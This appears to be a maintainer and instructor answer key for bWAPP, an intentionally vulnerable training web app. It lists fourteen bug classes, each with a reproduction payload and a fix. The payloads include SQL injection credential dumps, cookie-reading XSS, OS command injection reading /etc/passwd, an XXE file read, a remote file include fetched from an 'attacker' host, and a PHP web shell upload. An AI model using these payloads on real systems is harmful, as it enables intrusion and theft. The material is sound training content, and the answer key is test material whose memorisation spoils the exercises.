# bWAPP vulnerabilities

Answer key for the **bwapp** target (bWAPP, the "buggy web application"). The bugs
are selectable but unlabelled as to technique; this document is for maintainers and
instructors. bWAPP is upstream software with 100+ documented bugs, so these follow
its built-in category set; behaviour changes with the chosen security level.

> **Intentionally vulnerable. Isolated testing only.** Do not run bwapp anywhere it
> can be reached from an untrusted network.

- **App:** bWAPP (PHP + MySQL), the bee-box family "buggy web app"
- **Start:** `./vam start bwapp`
- **URL:** `http://127.0.0.1:7007`
- **Login:** `bee` / `bug`
- **Setup:** browse `/install.php` and click "install" once to create the DB (the
  fleet does this automatically).
- **Bug selector:** choose a bug from the dropdown on the portal (`/portal.php`);
  each opens its own page (e.g. `sqli_1.php`). Set the **security level**
  (low / medium / high) on that page; low is used below.

Status legend:

- **Live** - reachable and exploitable in the running app. (Every bWAPP item is Live.)

## Summary

| ID | Vulnerability | Category | Status |
|----|---------------|----------|--------|
| BW1 | SQL injection (GET / POST / AJAX / blind) | Injection | Live |
| BW2 | Cross-site scripting (reflected / stored / JSON) | Injection (XSS) | Live |
| BW3 | OS command injection (incl. blind) | Injection | Live |
| BW4 | HTML / PHP / iFrame / SSI injection | Injection | Live |
| BW5 | XML / XPath injection | Injection | Live |
| BW6 | LDAP injection | Injection | Live |
| BW7 | SMTP / mail header injection | Injection | Live |
| BW8 | XXE (XML external entity) | Injection / Misconfig | Live |
| BW9 | SSRF / remote and local file inclusion | SSRF / Injection | Live |
| BW10 | Unrestricted file upload | Insecure Design | Live |
| BW11 | Broken auth and session management | Broken Authentication | Live |
| BW12 | CSRF | Broken Access Control | Live |
| BW13 | Insecure direct object references | Broken Access Control | Live |
| BW14 | Security misconfig / sensitive data exposure | Misconfiguration | Live |

## Vulnerabilities

### BW1 - SQL injection

- **Where:** portal entries "SQL Injection (GET/Search)" `sqli_1.php`, "(POST)"
  `sqli_3.php`, "(AJAX/JSON)" `sqli_5.php`, and blind `sqli_6.php` / `sqli_15.php`.
- **Reproduce:** in the search field submit `iron' OR '1'='1` to dump the movies
  table, or `1' UNION SELECT login,password,3,4,5,6,7 FROM users-- -` to read
  credentials. Blind: `1' AND SLEEP(5)-- -` (time) or `1' AND 1=1` vs `1=2`.
- **Real-world fix:** parameterized queries everywhere and least-privilege DB users.

### BW2 - Cross-site scripting

- **Where:** "XSS - Reflected (GET/POST)" `xss_get.php` / `xss_post.php`, "Stored
  (Blog)" `xss_stored_1.php`, and JSON/AJAX/PHP_SELF variants.
- **Reproduce:** enter `<script>alert(document.cookie)</script>` in the
  first/last-name field (reflected) or a blog entry (stored, fires for every
  viewer). Medium/high add encoding to bypass with event handlers.
- **Real-world fix:** context-aware output encoding, input sanitization, and CSP.

### BW3 - OS command injection

- **Where:** "OS Command Injection" `commandi.php` and blind `commandi_blind.php`.
- **Reproduce:** in the DNS-lookup field submit `www.nsa.gov; cat /etc/passwd` (or
  `| whoami`); blind variant with a `; sleep 5` to infer execution.
- **Real-world fix:** avoid shelling out; use argument arrays with no shell and
  strict allowlists.

### BW4 - HTML / PHP / iFrame / SSI injection

- **Where:** `htmli_get.php`, `phpi.php`, `iframei.php`, `ssii.php`.
- **Reproduce:** inject markup (`<h1>owned</h1>`), PHP via the `message` param
  (`;phpinfo();`), a rogue `<iframe>` through the `ParamUrl`, or SSI
  (`<!--#exec cmd="id"-->`).
- **Real-world fix:** encode output, never `eval` user input, and disable SSI where
  not required.

### BW5 - XML / XPath injection

- **Where:** "XML/XPath Injection (Login/Search)" `xmli_1.php` / `xmli_2.php`.
- **Reproduce:** bypass the XPath login with `' or '1'='1` in the credential field,
  or inject into the genre/search XPath to return all nodes.
- **Real-world fix:** parameterize XPath queries and validate input.

### BW6 - LDAP injection

- **Where:** "LDAP Injection (Search)" `ldap.php` (present in the bee-box build).
- **Reproduce:** inject an LDAP filter such as `*)(uid=*))(|(uid=*` to bypass the
  filter and enumerate directory entries.
- **Real-world fix:** escape LDAP special characters and use parameterized filters.

### BW7 - SMTP / mail header injection

- **Where:** "SMTP/Mail Header Injection" `smtpi.php`.
- **Reproduce:** inject additional headers via a CRLF sequence in the email field
  (`victim@x.com%0aBcc: attacker@x.com`) to add recipients or forge headers.
- **Real-world fix:** strip CR/LF from header values and use a safe mail API.

### BW8 - XXE

- **Where:** "XML External Entity Attacks (XXE)" `xxe-1.php` (POST endpoint
  `xxe-2.php`).
- **Reproduce:** POST XML declaring an external entity,
  `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><reset><login>&e;</login></reset>`,
  to read local files or reach internal hosts (SSRF).
- **Real-world fix:** disable DTDs and external entity resolution in the parser.

### BW9 - SSRF / remote and local file inclusion

- **Where:** "Remote & Local File Inclusion (RFI/LFI)" `rlfi.php` and the
  language selector.
- **Reproduce:** LFI with `?language=../../../../etc/passwd%00`; RFI/SSRF with
  `?language=http://attacker/shell.txt` (fetches and executes a remote include, or
  reaches internal URLs).
- **Real-world fix:** allowlist include targets, disable `allow_url_include`, and
  block internal ranges.

### BW10 - Unrestricted file upload

- **Where:** "Unrestricted File Upload" `unrestricted_file_upload.php`.
- **Reproduce:** upload `shell.php` (`<?php system($_GET['c']); ?>`), then browse
  `/images/shell.php?c=id`. Medium checks extension/MIME; bypass with
  `shell.php.jpg` or a null byte.
- **Real-world fix:** validate content server-side, store outside the web root,
  rename, and never execute uploads.

### BW11 - Broken authentication and session management

- **Where:** "Broken Auth - Logout Management" `ba_logout_1.php`, "Insecure Login
  Forms" `ba_insecure_login_1.php`, "Session Mgmt - Cookies/URL".
- **Reproduce:** after logout the session id is still valid (replay it to stay
  authenticated); credentials are exposed in the HTML source; session ids appear in
  the URL / are predictable.
- **Real-world fix:** invalidate sessions on logout, never expose creds/session ids,
  and use secure, random session cookies.

### BW12 - CSRF

- **Where:** "Cross-Site Request Forgery (Change Password / Transfer)"
  `csrf_1.php` / `csrf_2.php`.
- **Reproduce:** host a page that auto-submits the password-change (or money
  transfer) request with no anti-CSRF token; a logged-in victim's password changes.
- **Real-world fix:** per-request anti-CSRF tokens, POST, and SameSite cookies.

### BW13 - Insecure direct object references

- **Where:** "Insecure DOR (Change Secret / Order Tickets)"
  `insecure_direct_object_ref_1.php` and directory traversal `directory_traversal_1.php`.
- **Reproduce:** change the numeric/identifier parameter (ticket, order, or user
  ref) to act on another user's object; traverse `?file=../../etc/passwd`.
- **Real-world fix:** enforce per-object authorization and canonicalize paths.

### BW14 - Security misconfiguration and sensitive data exposure

- **Where:** "Security Misconfig" and "Sensitive Data Exposure" portal entries
  (plus bee-box extras like Heartbleed / Shellshock, `phpinfo`, and clear-text
  transmission).
- **Reproduce:** observe default `bee`/`bug` creds, verbose errors, `phpinfo`
  disclosure, and secrets sent over plain HTTP or stored in the page.
- **Real-world fix:** harden config, remove debug output, enforce TLS, and patch
  known CVEs.

## Notes and scope

bWAPP's authoritative answer key is its own bug dropdown on `/portal.php`, which
enumerates every category and difficulty, plus the itsecgames.com bWAPP/bee-box
tutorials. Some entries (LDAP, Heartbleed, Shellshock) exist only in the full
bee-box image; the PHP/MySQL build here still covers the injection, XSS, auth, and
access-control classes above. Keep this file aligned with the version in
`apps/bwapp/app.yml`.
